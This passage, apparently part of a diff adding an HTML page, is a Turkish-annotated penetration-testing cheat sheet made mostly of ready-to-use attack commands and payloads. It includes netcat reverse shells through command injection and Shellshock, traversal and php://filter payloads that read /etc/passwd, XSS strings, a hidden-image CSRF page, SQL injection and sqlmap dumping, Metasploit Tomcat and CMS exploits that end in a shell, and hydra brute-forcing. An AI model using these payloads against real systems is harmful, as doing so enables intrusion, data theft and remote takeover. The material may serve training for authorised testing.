+-e /bin/bash</span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>&quot;)</span><span style='font-size:
+12.0pt;line-height:107%;font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>test</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>;system(&quot;</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>nc &lt;ip&gt; &lt;port&gt;
+-e /bin/bash</span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>&quot;)</span><span style='font-size:
+12.0pt;line-height:107%;font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'><span style='mso-spacerun:yes'>   </span></span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>nc -nvlp &lt;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>port</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>Directory Traversal – Files<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> cd ..<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>find</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'> /var/www/html<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> ../../etc/passwd<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> /%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> ../../../etc/passwd%00<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> ..%252f..%252f..%252fetc%252fpasswd<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> %252e%252e%252fetc%252fpasswd<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>passwd =
+/etc/passwd/ = /etc/passwd/<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>php://filter/read=string.rot13/resource=index.php<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> php://filter/read=string.rot13/resource=index<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> php://filter/convert.base64-encode/resource=index.php<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>php://filter/convert.base64-encode/resource=index<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>pHp://FilTer/convert.base64-encode/resource=index.php<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>pHp://FilTer/convert.base64-encode/resource=index<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>php://filter/convert.base64-encode/cat/resource=flag<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> dotdotpwn </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>-m </span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>http </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>-h </span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>URL</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&gt;<span style='mso-tab-count:
+1'>         </span></span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>not: </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>if site https &gt; </span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:#00B0F0'>-S<o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>Reflected XSS (GET)<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&lt;script&gt;</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>alert(&quot;hacked&quot;)</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&lt;/script&gt;</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&lt;ScRiPt&gt;</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>alert(&quot;hacked&quot;)</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&lt;/ScRiPt&gt;</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>XSS - Reflected (AJAX/JSON)<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> &lt;img src=a
+onerror=alert(1)&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>&lt;script&gt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>alert(&quot;hacked&quot;)</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>&lt;/script&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>CSRF<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> inspect
+element &gt; storage &gt; cookies &gt; uuid change<o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:yellow'>&lt;!DOCTYPE html&gt;<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:yellow'>&lt;html&gt;<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:yellow'><span style='mso-tab-count:
+1'>            </span>&lt;body&gt;<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:yellow'><span style='mso-tab-count:
+2'>                        </span>&lt;h1&gt;hacked&lt;/h1&gt;<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:yellow'><span style='mso-tab-count:
+2'>                        </span>&lt;img style=&quot;display:
+none&quot;,src=&quot;change password url&quot;,alt=&quot;&quot;&gt;<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:yellow'><span style='mso-tab-count:
+1'>            </span>&lt;/body&gt;<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:yellow'>&lt;/html&gt;<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>SQL<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>ÖR: </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>SELECT * FROM
+accounts WHERE username='oz' AND password='''<o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>AND</span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'><o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'>SELECT * FROM accounts WHERE username=</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>'</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>oz</span><span style='font-size:
+12.0pt;line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>'</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'> AND password=</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>'</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>1</span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>'</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> AND 1=1#<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> 1' AND 1=1#<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> 1' AND 1=1--<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>1' AND 1;#<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>oz</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>'#</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'><span
+style='mso-spacerun:yes'> </span>SELECT * FROM accounts WHERE username='oz'
+#<span style='mso-spacerun:yes'>  </span>AND password='1' AND 1=1#<o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'><span
+style='mso-spacerun:yes'> </span>OR<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> 1' OR 1=1#<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'><span style='mso-spacerun:yes'> </span></span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>-</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'> 1' OR 1;#<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'><span
+style='mso-spacerun:yes'> </span>SELECT * FROM accounts WHERE username='oz' #
+AND password='1' OR 1=1#<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'><span
+style='mso-spacerun:yes'> </span>url de denemek için de brupsuite ile '#
+ifadelerini hex koduna çevir.<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>Sqlmap<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt;mso-list:l12 level1 lfo44'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:yellow'>sqlmap -r &lt;sqlmap.txt&gt;
+--dbs (database çekmek için) –random-agent –threads 10<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l12 level1 lfo44'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:yellow'>sqlmap -r &lt;sqlmap.txt&gt;
+-D &lt;database_name&gt; --tables –random-agent –threads 10<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l12 level1 lfo44'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:yellow'>sqlmap -r &lt;sqlmap.txt&gt;
+-D &lt;database_name&gt; -T &lt;table_name&gt; --columns –random-agent –threads
+10<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l12 level1 lfo44'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:yellow'>sqlmap -r &lt;sqlmap.txt&gt;
+-D &lt;database_name&gt; -T &lt;table_name&gt; -C &lt;user&gt;, &lt;login&gt;
+--<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt;mso-list:l12 level1 lfo44'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:yellow'>dump –random-agent –threads
+10<o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>ShellSock<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>'() {:;}; /bin/bash -c “nc &lt;ip&gt;
+&lt;port&gt; -e /bin/bash'<o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>Hearbleed<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>nmap –script ss-heartbleed &lt;ip&gt; -p
+&lt;target_port&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>python heartbleed.py &lt;ip&gt; -p
+&lt;port&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B050'>WebDay<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>davtest -url &lt;ip/webdav/&gt;
+-directory test<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>davtest -url &lt;ip/webdav/ -uploadloc
+test -uploadfile /root/Shell.php<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B050'>Drupal<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>droopescan scan drupal -u &lt;url&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B050'>DNS Zone<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>nmap &lt;ip&gt; -p 53, 445 -A<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>dig AXFR &lt;yakalanan_domain&gt;
+@&lt;ip&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B050'>Tomcat Apache2<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>msfconsole<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>search tomcat (user 7)<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>use
+auxiliary/scanner/http/tomcat_mgr_login<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>set rhost<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>set STOP_ON_SUCCESS true //tespit
+ettiğinde dur<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>run<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>sifre bulunursa apache2 tomcat içine
+girilir. Bunun için,<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>use exploit/multi/http/tomcat_mgr_upload<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>set HTTPPASSWORD &lt;bulunan_password&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>set HTTPUSERNAME &lt;bulunan_username&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>set RHOST<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>set RPORT<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>run<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>shell<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B050'>CMS<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>msfconsole<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>use
+exploit/multi/handler/http/lcms_php_exec<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>set URI /cms/<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>set RHOST<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>run<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>shell<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B050'>Wordpress<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>wpsscan –url &lt;target&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>wpsscan –url &lt;target&gt; --enumerate u<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B050'>Joomla<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>joomscan -u &lt;url&gt;<o:p></o:p></span></p>
+				</pre>
+
+			</div>
+
+			<div id="C3">
+				<h1 id="bruteforce" align=center style='text-align:center;color: darkred;'>Bruteforce</h1>
+				<pre>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt;mso-list:l24 level1 lfo9'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B0F0'><span
+style='mso-list:Ignore'>1)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>hydra -V -L &lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>wordlist</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&gt; -p &lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>passwordlist</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>&gt; &lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>ip</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&gt; http-post-form (</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>get Burp &gt; repeater</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>) ‘</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&lt;/page:&lt;burp:F(errormessage)=Invalid username</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>’&gt;<o:p></o:p></span></p>
+
+<div style='mso-element:para-border-div;border:none;border-bottom:solid windowtext 1.0pt;
+mso-border-bottom-alt:solid windowtext .75pt;padding:0cm 0cm 1.0pt 0cm;
+margin-left:36.0pt;margin-right:0cm'>
+
+<p class=MsoNormal style='border:none;mso-border-bottom-alt:solid windowtext .75pt;
+padding:0cm;mso-padding-alt:0cm 0cm 1.0pt 0cm'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:yellow'>Ör: </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>hydra</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'> -V -L </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&lt;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>username.txt</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&gt;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'> -p </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&lt;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>password.txt</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&gt;</span><span style='font-size:12.0pt;line-height:107%;
